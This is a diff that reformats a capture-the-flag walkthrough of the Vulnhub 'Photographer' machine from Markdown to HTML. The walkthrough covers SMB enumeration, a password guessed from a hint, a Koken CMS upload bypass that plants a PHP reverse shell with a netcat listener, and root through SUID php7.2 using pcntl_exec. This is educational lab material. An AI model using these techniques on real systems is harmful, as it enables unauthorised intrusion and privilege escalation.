@@ -243,9 +243,7 @@ into the {body} of the default.hbs template -->
 
 <p>Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.</p>
 
-<pre>
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
 Nmap scan report for 192.168.1.77
@@ -267,7 +265,7 @@ Service Info: Host: PHOTOGRAPHER
 
 Host script results:
 |_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
-|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
 | smb-os-discovery: 
 |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
 |   Computer name: photographer
@@ -288,28 +286,26 @@ Host script results:
 |_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds                                                                 
-```
-&lt;/pre&gt;
+Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
+</code></pre></div></div>
 
-The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.
+<p>The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.</p>
 
-### Enumeration
+<h3 id="enumeration">Enumeration</h3>
 
-I started with port 80 but didn't find anything interesting. I ran Gobuster and Nikto and both came up blank so decided to move on for now. On port 8000 I'm presented with a CMS type page. Looking at the footer indicates 'Built with Koken'.
+<p>I started with port 80 but didn’t find anything interesting. I ran Gobuster and Nikto and both came up blank so decided to move on for now. On port 8000 I’m presented with a CMS type page. Looking at the footer indicates ‘Built with Koken’.</p>
 
-![Port 8000](/assets/images/photographer/Port-8000.png)
+<p><img src="/assets/images/photographer/Port-8000.png" alt="Port 8000" /></p>
 
-A quick Google shows [Koken](http://koken.me/) is a CMS for photographers. An [exploit](https://www.exploit-db.com/exploits/48706) is also available by the same author of the machine which would indicate this is the intend path. However, the exploit requires authentication. 
+<p>A quick Google shows <a href="http://koken.me/">Koken</a> is a CMS for photographers. An <a href="https://www.exploit-db.com/exploits/48706">exploit</a> is also available by the same author of the machine which would indicate this is the intend path. However, the exploit requires authentication.</p>
 
-![Exploit](/assets/images/photographer/exploit.png)
+<p><img src="/assets/images/photographer/exploit.png" alt="Exploit" /></p>
 
-Looking at the exploit, the POST request makes a call to **/admin/**. Going to the URL does provide a login page requiring a email address and password. I will take a look at Samba before going any further on the web ports.
+<p>Looking at the exploit, the POST request makes a call to <strong>/admin/</strong>. Going to the URL does provide a login page requiring a email address and password. I will take a look at Samba before going any further on the web ports.</p>
 
-![Login](/assets/images/photographer/login.png)
+<p><img src="/assets/images/photographer/login.png" alt="Login" /></p>
 
-Using smbclient and logging in anonymously shows one share in particular that looks interesting 'sambashare'. 
-
+<p>Using smbclient and logging in anonymously shows one share in particular that looks interesting ‘sambashare’.</p>
 <pre>
 ```
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
@@ -340,9 +336,7 @@ getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 K
 smb: \&gt; 
 ```
 </pre>
-
-Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.
-
+<p>Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.</p>
 <pre>
 ```
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
@@ -362,69 +356,65 @@ Hi Daisa!
 Your site is ready now.
 Don\'t forget your secret, my babygirl ;)
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $                                                                                                                       
+└──╼ $
 ```
 </pre>
+<p>‘babygirl’ looks to be a hint to the password and I now have 2 users and email addresses:</p>
 
-'babygirl' looks to be a hint to the password and I now have 2 users and email addresses:
+<ul>
+  <li>Agi Clarence - agi@photographer.com</li>
+  <li>Daisa Ahomi - daisa@photographer.com</li>
+</ul>
 
-- Agi Clarence - agi@photographer.com
-- Daisa Ahomi - daisa@photographer.com
+<h3 id="foot-hold">Foot hold</h3>
 
-### Foot hold
+<p>I go back to port <strong>8000/admin/</strong> and try them out. I get straight in with <strong>daisa@photographer.com</strong> and <strong>babygirl</strong>.</p>
 
-I go back to port **8000/admin/** and try them out. I get straight in with **daisa@photographer.com** and **babygirl**. 
+<p><img src="/assets/images/photographer/cms.png" alt="CMS" /></p>
 
-![CMS](/assets/images/photographer/cms.png)
-
-Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
+<p>Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a>.</p>
 
 <pre>
 ```
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $mv php-reverse-shell.php shell.php.jpg                                                                                 
+└──╼ $mv php-reverse-shell.php shell.php.jpg
 ```
 </pre>
-
-I update the script with my local IP and port details.
-
+<p>I update the script with my local IP and port details.</p>
 <pre>
 ```
 $ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS                                                                                           
+$port = 1234;       // CHANGE THIS
 ```
 </pre>
-
-Start a netcat listener ready to catch the shell.
-
+<p>Start a netcat listener ready to catch the shell.</p>
 <pre>
 ```
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $sudo nc -nvlp 443
-listening on [any] 443 ...                                                                                                   
+listening on [any] 443 ...
 ```
 </pre>
 
-Going back to the admin page I upload the file using 'Import content' and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select 'Import'.
+<p>Going back to the admin page I upload the file using ‘Import content’ and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select ‘Import’.</p>
 
-![Content](/assets/images/photographer/content.png)
+<p><img src="/assets/images/photographer/content.png" alt="Content" /></p>
 
-In Burp I can now remove the .jpg extension from the file and forward the request.
+<p>In Burp I can now remove the .jpg extension from the file and forward the request.</p>
 
-![Burp](/assets/images/photographer/burp.png)
+<p><img src="/assets/images/photographer/burp.png" alt="Burp" /></p>
 
-With the file selected, right clicking on 'Download File' and 'Open Link in New Tab' should run out PHP script. 
+<p>With the file selected, right clicking on ‘Download File’ and ‘Open Link in New Tab’ should run out PHP script.</p>
 
-![DownloadFile](/assets/images/photographer/downloadfile.png)
+<p><img src="/assets/images/photographer/downloadfile.png" alt="DownloadFile" /></p>
 
-I have a shell as www-data! First thing I always do is upgrade it to a more stable TTY using Python.
+<p>I have a shell as www-data! First thing I always do is upgrade it to a more stable TTY using Python.</p>
 
-![Shell](/assets/images/photographer/shell.png)
+<p><img src="/assets/images/photographer/shell.png" alt="Shell" /></p>
 
-The first flag can be found in Daisa's user directory.
-
+<p>The first flag can be found in Daisa’s user directory.</p>
 <pre>
 ```
 www-data@photographer:/$ cd home/daisa/
@@ -433,29 +423,31 @@ Desktop    Downloads  Pictures  Templates  examples.desktop
 Documents  Music      Public    Videos     user.txt
 www-data@photographer:/home/daisa$ cat user.txt 
 d41d8cd98f00{REDACTED}
-www-data@photographer:/home/daisa$                                                                                           
+www-data@photographer:/home/daisa$
 ```
 </pre>
 
-### Privilege Escalation
+<h3 id="privilege-escalation">Privilege Escalation</h3>
 
-I now need to escalate out of www-data to either a user or root. Im going to use [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to enumerate the machine for possible local privilege escalation paths. First I will use Python to copy the script from my machine.
+<p>I now need to escalate out of www-data to either a user or root. Im going to use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linpeas</a> to enumerate the machine for possible local privilege escalation paths. First I will use Python to copy the script from my machine.</p>
 
-![linpeas](/assets/images/photographer/linpeas.png)
+<p><img src="/assets/images/photographer/linpeas.png" alt="linpeas" /></p>
 
-Linpeas provides a lot of output, looking through the output **/usr/bin/php7.2** jumps out. 
+<p>Linpeas provides a lot of output, looking through the output <strong>/usr/bin/php7.2</strong> jumps out.</p>
 
-&gt; Linpeas will colour code the output based on severity but notice /usr/bin/php7.2 is green. Its important to review all the output and not rely on the scripts/tools to identify potential attack vectors.
+<blockquote>
+  <p>Linpeas will colour code the output based on severity but notice /usr/bin/php7.2 is green. Its important to review all the output and not rely on the scripts/tools to identify potential attack vectors.</p>
+</blockquote>
 
-![suid](/assets/images/photographer/suid.png)
+<p><img src="/assets/images/photographer/suid.png" alt="suid" /></p>
 
-First I will check [GTFOBins](https://gtfobins.github.io), searching PHP.
+<p>First I will check <a href="https://gtfobins.github.io">GTFOBins</a>, searching PHP.</p>
 
-![gtfobins](/assets/images/photographer/phpsuid.png)
+<p><img src="/assets/images/photographer/phpsuid.png" alt="gtfobins" /></p>
 
-Lets give it a go.
-
+<p>Lets give it a go.</p>
 <pre>
+
 ```
 www-data@photographer:/tmp$ CMD="/bin/sh"
 www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
@@ -467,7 +459,7 @@ root
 ```
 </pre>
 
-We have root! Lets grab the flag.
+<p>We have root! Lets grab the flag.</p>
 
 <pre>
 ```
@@ -506,9 +498,8 @@ Follow me at: http://v1n1v131r4.com
 d41d8cd98f00{REDACTED}
 #
 ```
-<pre>
+</pre>
 
-</pre></pre></unknown></unknown></pre>
 
                 </div>
             </section>
